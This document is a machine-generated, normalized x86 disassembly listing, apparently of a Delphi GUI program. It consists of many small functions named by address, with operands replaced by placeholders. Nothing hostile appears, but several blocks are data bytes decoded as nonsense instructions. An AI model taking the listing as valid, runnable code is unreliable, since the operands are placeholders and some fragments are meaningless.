call [ ebx + 0x2b8 ]
sub_474632
jmp sub_403a3c
sub_474e22
jmp sub_403a3c
sub_474f67
jmp sub_403a3c
sub_474f6e
pop ebx
mov esp ebp
pop ebp
retn
sub_47519c
push ebx
mov ebx eax
mov eax ebx
call sub_44c748
mov eax ebx
call sub_464294
mov [ ebx + 0x2a4 ] eax
pop ebx
retn
sub_4752c8
jmp sub_403a3c
sub_4752d4
mov ecx [ edx ]
sub ecx 0x84
jne r-xdata
call sub_450acc
retn
mov [ edx + 0xc ] 0x1
sub_4755e3
jmp sub_403a3c
sub_4755ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4757ad
jmp sub_403a3c
sub_4757b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475a8a
jmp sub_403788
sub_475ae2
jmp sub_403a3c
sub_475ae9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475b5c
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_475af0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_475b74
mov edx [ eax + 0x2c4 ]
test edx edx
je r-xdata
call sub_4825f0
retn
cmp edx eax
je r-xdata
mov eax edx
mov edx [ eax ]
call [ edx + 0x148 ]
retn
sub_475bc0
push ebx
mov ebx eax
lea eax [ ebx + 0x2f8 ]
call sub_40d4f0
mov eax ebx
call sub_481c00
pop ebx
retn
sub_475c90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebp
retn 0xc
sub_476180
mov al 0x1
retn
sub_476184
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd9c
mov edx esi
mov eax ebx
call sub_47408c
pop esi
pop ebx
retn
sub_4762d1
jmp sub_403a3c
sub_4762d8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4767c8
mov ecx edx
add cl 0xfe
sub cl 0x2
jae r-xdata
retn
call sub_4813a8
sub_476b4c
jmp sub_403a3c
sub_476b53
pop ebx
mov esp ebp
pop ebp
retn
sub_476cd8
mov eax [ r-xdata ]
retn
sub_476d78
push ebx
mov ebx eax
mov eax [ ebx + 0x310 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_44cd9c
mov eax [ ebx + 0x308 ]
call sub_44cd9c
sub_476e08
cmp dl [ eax + 0x314 ]
je r-xdata
retn
mov [ eax + 0x314 ] dl
call sub_450658
sub_476f00
mov dl 0x1
call sub_44c7d0
retn
sub_476fc0
retn
sub_476fc4
mov edx [ eax ]
call [ edx + 0x17c ]
retn
sub_477552
jmp sub_403a3c
sub_477559
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477744
push ebx
mov ebx eax
mov eax ebx
call sub_473b98
mov eax ebx
call sub_473bdc
pop ebx
retn
sub_4778ac
xor eax eax
retn
sub_477a2b
jmp sub_403a3c
sub_477b20
cmp dl [ eax + 0x30d ]
je r-xdata
retn
mov [ eax + 0x30d ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_477c01
jmp sub_403a3c
sub_477c08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_477e93
jmp sub_403a3c
sub_477e9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47812c
push ebx
mov ebx eax
lea eax [ ebx + 0x314 ]
call sub_40d4f0
lea eax [ ebx + 0x318 ]
call sub_40d4f0
lea eax [ ebx + 0x31c ]
call sub_40d4f0
pop ebx
retn
sub_4782f8
cmp [ edx + 0x4 ] 0x12
sete cl
mov [ eax + 0x28a ] cl
call sub_47561c
retn
sub_47830c
cmp [ edx + 0x4 ] 0x12
sete cl
mov [ eax + 0x28a ] cl
call sub_45207c
retn
sub_4783bd
jmp sub_403a3c
sub_4783c4
pop ecx
pop ebp
retn
sub_4786d0
mov eax [ eax + 0x1ac ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2a4 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4788c4
jmp sub_403a3c
sub_4788cb
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47896a
jmp sub_403a3c
sub_478971
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478cb8
retn
sub_478dbe
jmp sub_403a3c
sub_478dc5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_478ea3
jmp sub_403a3c
sub_478eaa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4790b0
jmp sub_403a3c
sub_4790f7
jmp sub_403a3c
sub_479238
push ebx
push esi
mov ebx eax
mov [ ebx + 0x1b1 ] 0x1
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov eax ebx
call sub_4826fc
pop esi
pop ebx
retn
sub_4795c2
jmp sub_403a3c
sub_4795c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4795ec
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax ebx
call sub_483b60
pop ebx
retn
sub_47973c
retn
sub_4797c8
jmp sub_403a3c
sub_4797cf
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_479835
jmp sub_403a3c
sub_47983c
pop ebp
retn
sub_479840
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_47a993
add [ eax - 0xd ] cl
inc edi
add [ eax + esi * 8 - 0x6b27ffb9 ] dl
inc ecx
add al ch
out 0x47 eax
add ah bh
0xf2dc0047 0x47
sub_47b20a
0x1cffdeff 0xeb0
sub_47b211
mov al 0x2
mov ah 0x11
mov ah 0xdc
dec [ eax + eax ]
jmp r-xdata
dec ebx
sub_47b41f
[ eax + 0x30000000 ]
sub_47b4d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_47b733
jmp sub_403a3c
j_sub_403788#3
jmp sub_403788
sub_47bb02
jmp sub_403a3c
sub_47bb09
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb2b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_47bb24
jmp sub_403a3c
sub_47bb2b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bbdc
jmp sub_403788
sub_47bc1f
jmp sub_403a3c
sub_47bc26
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47be41
jmp sub_403a3c
j_sub_403788#2
jmp sub_403788
sub_47bf8e
jmp sub_403a3c
sub_47bf9f
jmp sub_403788
sub_47bfd9
jmp sub_403a3c
sub_47bfe0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c04e
jmp sub_403a3c
sub_47c055
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c0e8
push esi
mov esi eax
mov eax [ esi + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47c1fc
jmp sub_403a3c
sub_47c203
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c36b
jmp sub_403a3c
sub_47c372
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c433
jmp sub_403a3c
sub_47c43a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c492
jmp sub_403a3c
sub_47c499
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47c66c
push ebx
mov ebx eax
mov eax [ ebx + 0x6c ]
call sub_419748
test eax eax
setg al
pop ebx
retn
j_sub_403788
jmp sub_403788
sub_47c781
jmp sub_403a3c
sub_47c788
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c7f4
jmp sub_403a3c
sub_47c7fb
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c9a8
jmp sub_403a3c
sub_47c9c5
jmp sub_403a3c
sub_47c9cc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47cabc
jmp sub_403a3c
sub_47cac3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47cacc
push ebx
mov ebx eax
mov eax ebx
call sub_419a58
pop ebx
retn
sub_47cad8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419750
pop esi
pop ebx
retn
sub_47ccee
jmp sub_403a3c
sub_47ccf5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d17b
jmp sub_403a3c
sub_47d20a
jmp sub_403a3c
sub_47d211
mov al [ ebp - 0x1d ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d22b
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x62bee8c3 ]
clc
inc esi
inc ebx
and al 0x1
pop ebx
retn
sub_47d3a0
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
mov dl 0x1
call sub_47cd2c
sub_47d597
jmp sub_403a3c
sub_47d5b0
xor edx edx
mov [ eax + 0xc ] edx
retn
sub_47d5b8
retn
sub_47d8b4
retn
sub_47d99b
jmp sub_403a3c
sub_47d9a2
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_47d9a8
test edx edx
jne r-xdata
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
add eax 0x2c
call sub_40d4f0
retn
sub_47dad8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x31 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x31 ] al
sub_47daf0
push esi
mov esi eax
cmp edx [ esi + 0x24 ]
je r-xdata
pop esi
retn
mov [ esi + 0x24 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
sub_47db04
mov [ eax + 0x1c ] edx
retn
sub_47db08
cmp dl [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] dl
xor eax eax
call sub_47b62c
sub_47dbbd
add [ eax ] al
add [ esi - 0x75 ] dl
jo r-xdata
mov si 0xffd0
call sub_4034a4
test esi esi
je r-xdata
pop esi
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax esi
sub_47dbdc
push esi
mov esi eax
cmp dl [ esi + 0x38 ]
je r-xdata
pop esi
retn
mov [ esi + 0x38 ] dl
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0xcc ]
sub_47dcab
jmp sub_403a3c
sub_47dd04
push ebx
mov ebx eax
mov eax ebx
call sub_47db08
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
pop ebx
retn
mov dl [ ebx + 0x30 ]
call sub_44c794
sub_47dd78
push ebx
mov ebx eax
mov eax ebx
call sub_4195a8
pop ebx
retn
sub_47ddbc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419750
pop esi
pop ebx
retn
sub_47ddd0
xor eax eax
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov al [ eax + 0x7c ]
sub_47de2c
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
push eax
push sub_47dd84
mov edx eax
call sub_47d27c
sub_47de44
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0x7c ] dl
sub_47deac
push ebx
mov ebx eax
mov eax ebx
call sub_4195a8
pop ebx
retn
sub_47e19b
jmp sub_403a3c
sub_47e262
jmp sub_403a3c
sub_47e340
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_47e429
jmp sub_403a3c
sub_47e430
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e4ff
jmp sub_403a3c
sub_47e506
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e9a7
jmp sub_403a3c
sub_47e9ae
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47ead1
jmp sub_403a3c
sub_47ead8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eaf5
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_47eaee
jmp sub_403a3c
sub_47eaf5
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47eb5c
mov eax [ r-xdata ]
retn
sub_47ec85
jmp sub_403a3c
sub_47ec8c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47ed30
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_47edb6
jmp sub_403a3c
sub_47edbd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47edc4
push esi
push edi
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47f1a9
jmp sub_403a3c
sub_47f1b0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f644
test eax eax
je r-xdata
retn
mov ecx [ eax + 0x68 ]
mov ecx [ ecx + 0x18 ]
cmp ecx [ edx + 0x50 ]
je r-xdata
mov eax [ eax + 0x68 ]
mov edx [ edx + 0x50 ]
call sub_4244a4
sub_47f71c
mov edx [ eax + 0x44 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax edx
retn
cmp [ eax + 0x44 ] 0x1fffffff
jne r-xdata
mov edx [ eax + 0x40 ]
sub_47f734
mov edx [ eax + 0x60 ]
cmp edx 0x20000000
jne r-xdata
mov eax edx
retn
mov edx 0x13
mov eax [ eax + 0x40 ]
call sub_46ebb4
retn
sub_47f884
xor edx edx
mov [ eax + 0x70 ] edx
retn
sub_47fa53
retn
sub_47faa4
push ebx
mov [ eax + 0x24c ] 0x1
mov [ eax + 0x250 ] 0x1
xor ebx ebx
mov [ eax + 0x26c ] ebx
xor ebx ebx
mov [ eax + 0x268 ] ebx
call sub_44f7b8
pop ebx
retn
sub_47fad0
retn
sub_47fc38
jmp sub_403a3c
sub_47fd4e
jmp sub_403a3c
sub_47fe68
jmp sub_403a3c
sub_48078d
jmp sub_403a3c
sub_480794
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4808ac
jmp sub_403a3c
sub_4808b3
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48097c
jmp sub_403a3c
sub_480983
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_481004
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x118 ]
cmp [ ebx + 0x242 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_4810a7
jmp sub_403a3c
sub_4810ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4810d1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425444
retn
sub_4810ca
jmp sub_403a3c
sub_4810d1
pop ebx
pop ecx
pop ebp
retn
sub_48142e
jmp sub_403a3c
sub_48143c
cmp edx [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] edx
call sub_44f978
sub_48148c
cmp dl [ eax + 0x248 ]
je r-xdata
retn
mov [ eax + 0x248 ] dl
call sub_44cde8
sub_481878
cmp [ eax + 0x224 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
xor eax eax
retn
mov al 0x1
cmp [ eax + 0x225 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
retn
sub_48189c
push esi
mov esi eax
cmp edx [ esi + 0x258 ]
je r-xdata
pop esi
retn
mov [ esi + 0x258 ] edx
mov eax esi
call sub_44f978
mov eax esi
mov si 0xffee
call sub_4034a4
sub_4818c4
push esi
mov esi eax
cmp edx [ esi + 0x254 ]
je r-xdata
pop esi
retn
mov [ esi + 0x254 ] edx
mov eax esi
call sub_44f978
mov eax esi
mov si 0xffee
call sub_4034a4
sub_4818ec
mov edx [ eax ]
call [ edx + 0x120 ]
retn
sub_48196b
jmp sub_403a3c
sub_4819eb
jmp sub_403a3c
sub_4819f2
pop ebx
mov esp ebp
pop ebp
retn
sub_481db8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebx
retn
sub_482517
jmp sub_403a3c
sub_48252c
push esi
mov esi eax
mov eax esi
call sub_452758
mov eax esi
call sub_48254c
mov edx [ eax ]
call [ edx + 0x38 ]
pop esi
retn
sub_482544
mov eax [ r-xdata ]
retn
sub_4825f0
mov edx [ eax + 0x214 ]
test edx edx
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_484674
retn
cmp [ edx + 0xc8 ] 0x0
je r-xdata
mov eax [ edx + 0xc8 ]
retn
sub_482a74
push esi
mov esi eax
mov eax esi
call sub_44e48c
cmp [ esi + 0x16c ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_48302c
jmp sub_403a3c
sub_483033
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
sub_483049
jmp sub_403a3c
sub_4832e3
jmp sub_403a3c
sub_4832ea
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4833bc
jmp sub_403a3c
sub_4833c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_48379b
jmp sub_403a3c
sub_4837a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4837ac
push esi
mov si 0xffd0
call sub_4034a4
pop esi
retn
sub_4839b6
jmp sub_403a3c
sub_4839bd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_483b8c
mov [ edx + 0xc ] 0x1
retn
sub_483bc8
mov eax [ eax + 0x160 ]
call sub_425260
retn
sub_483fc0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x168 ]
test eax eax
je r-xdata
pop esi
retn
mov si 0xffcf
call sub_4034a4
sub_483fe0
xor edx edx
mov ecx [ eax + 0x16c ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x50 ]
sub_48409c
mov edx [ eax + 0x16c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax edx
call sub_47eb64
retn
sub_4840b4
push esi
mov esi [ eax + 0x16c ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
sub_4841d0
jmp sub_403a3c
sub_4841d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48444f
jmp sub_403a3c
sub_48465c
cmp eax [ edx + 0x8 ]
je r-xdata
retn
cmp [ eax + 0x170 ] 0x0
je r-xdata
xor edx edx
call sub_484610
sub_4846e3
jmp sub_403a3c
sub_4846ea
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_484735
jmp sub_403a3c
sub_48473c
pop ebp
retn
sub_48477f
jmp sub_403a3c
sub_484786
pop ebp
retn
sub_484818
pushad
retn 0x44
sub_48556c
pushad
retn 0x44
sub_485cfe
jmp sub_403a3c
sub_485ea8
jmp sub_403a3c
sub_485eaf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485f1f
jmp sub_403a3c
sub_485f26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_485ff1
jmp sub_403a3c
sub_485ff8
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_486000
retn
sub_4862d9
jmp sub_403a3c
sub_4862e0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4863e4
mov eax [ r-xdata ]
retn
sub_4863ec
push ebx
mov ebx eax
mov eax ebx
call sub_476d78
mov eax [ ebx + 0x318 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_44cd9c
sub_48674f
jmp sub_403a3c
sub_486756
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_486c5c
jmp sub_403a3c
sub_486d3e
jmp sub_403a3c
sub_486d45
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_487022
jmp sub_403a3c
sub_487084
mov eax [ r-xdata ]
retn
sub_4870cc
mov eax [ r-xdata ]
retn
sub_4870d4
mov eax [ r-xdata ]
retn
sub_487259
jmp sub_403a3c
sub_487260
pop ebx
mov esp ebp
pop ebp
retn
sub_4877e3
jmp sub_403a3c
sub_487aa3
jmp sub_403a3c
sub_487aaa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_487bb8
jmp sub_403a3c
sub_487bbf
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_487cad
jmp sub_403a3c
sub_487cb4
pop ebp
retn
sub_487cb8
sub [ rw-data ] 0x1
retn
sub_487e94
mov eax [ r-xdata ]
retn
sub_487e9c
push ebx
mov ebx edx
mov eax ebx
mov edx r-xdata
call sub_40408c
pop ebx
retn
sub_487efe
retn
sub_487eff
jmp sub_403a3c
j_sub_487efe
jmp sub_487efe
sub_487f06
pop ebp
retn
sub_487f6f
jmp sub_403a3c
sub_487f76
pop ecx
pop ebp
retn
sub_488410
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_488424
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_488438
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_48844c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_48851a
jmp sub_403a3c
sub_488528
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_48853c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_488550
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_488564
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_488580
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4885f0
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_48860c
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_488648
inc [ eax + 0x3c ]
retn
sub_48896c
jmp sub_403a3c
sub_488973
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4889e8
jmp sub_403a3c
sub_4889ef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488a5f
jmp sub_403a3c
sub_488a66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488ad3
jmp sub_403a3c
sub_488ada
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488b8f
jmp sub_403a3c
sub_488b96
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488c25
jmp sub_403a3c
sub_488c2c
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_488c9f
jmp sub_403a3c
sub_488ca6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488d18
jmp sub_403a3c
sub_488d1f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488d94
jmp sub_403a3c
sub_488d9b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488e0b
jmp sub_403a3c
sub_488e12
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488e7f
jmp sub_403a3c
sub_488e86
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488ef8
jmp sub_403a3c
sub_488eff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_488f78
jmp sub_403a3c
sub_488f7f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_488ffc
jmp sub_403a3c
sub_489003
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_48905c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42c2a8
pop esi
pop ebx
retn
sub_489070
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_4890df
jmp sub_403a3c
sub_4890e6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_489153
jmp sub_403a3c
sub_48915a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_489185
jmp sub_403a3c
sub_48918c
pop ebp
retn
sub_489190
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_48864c
mov [ rw-data ] eax
sub_4895e2
jmp sub_403a3c
sub_4895e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_489761
jmp sub_403a3c
sub_489768
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4897b5
jmp sub_403a3c
sub_4897bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a3c#9
jmp sub_403a3c
sub_4899d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_489ba6
jmp sub_403a3c
sub_489bad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_489bdd
jmp sub_403a3c
sub_489be4
pop ebp
retn
sub_489be8
sub [ rw-data ] 0x1
retn
sub_48a8d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44df48
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_48a94c
push ebx
mov ebx eax
mov eax ebx
call sub_4517ec
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_48b12c
sub_48a9c8
jmp sub_403a3c
sub_48a9cf
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a3c#7
jmp sub_403a3c
sub_48aa73
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48ab72
jmp sub_403a3c
sub_48ab79
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ac8e
jmp sub_403a3c
sub_48ac95
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ac9c
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
j_sub_403a3c#5
jmp sub_403a3c
sub_48ad68
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ae3c
mov eax [ eax + 0x208 ]
retn
sub_48b08a
jmp sub_403a3c
sub_48b11c
jmp sub_403a3c
sub_48b123
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48b16c
xor edx edx
call sub_48aa7c
retn
sub_48b174
mov al 0x1
retn
sub_48b365
jmp sub_403a3c
sub_48b36c
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403a3c#4
jmp sub_403a3c
sub_48b559
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48b598
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_48b5dc
mov edx eax
mov eax ebx
call sub_48aebc
pop ebx
retn
sub_48b7ec
jmp sub_403a3c
sub_48b7f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403a3c#3
jmp sub_403a3c
sub_48b886
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48b90d
jmp sub_403a3c
sub_48b914
pop ebx
mov esp ebp
pop ebp
retn
sub_48ba1a
jmp sub_403a3c
sub_48ba21
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48bc72
jmp sub_403a3c
sub_48bc79
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48bd1c
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_48be02
jmp sub_403a3c
sub_48be09
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403a3c#2
jmp sub_403a3c
